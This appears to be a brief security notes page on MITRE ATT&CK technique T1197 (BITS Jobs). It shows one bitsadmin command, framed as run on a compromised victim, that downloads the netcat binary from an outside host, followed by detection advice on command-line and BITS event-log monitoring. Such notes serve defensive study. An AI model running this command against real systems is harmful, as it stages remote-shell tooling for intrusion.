---
description: File upload to the compromised system.
---

# T1197: BITS Jobs

## Execution

{% code title="attacker@victim" %}
```c
bitsadmin /transfer myjob /download /priority high http://10.0.0.5/nc64.exe c:\temp\nc.exe
```
{% endcode %}

![](../../.gitbook/assets/bits-download.png)

## Observations

Commandline arguments monitoring can help discover bitsadmin usage:

![](../../.gitbook/assets/bits-cmdline.png)

`Application Logs > Microsoft > Windows > Bits-Client > Operational` shows logs related to jobs, which you may want to monitor as well. An example of one of the jobs:

![](../../.gitbook/assets/bits-operational-logs.png)

## References

{% embed url="https://attack.mitre.org/wiki/Technique/T1197" %}

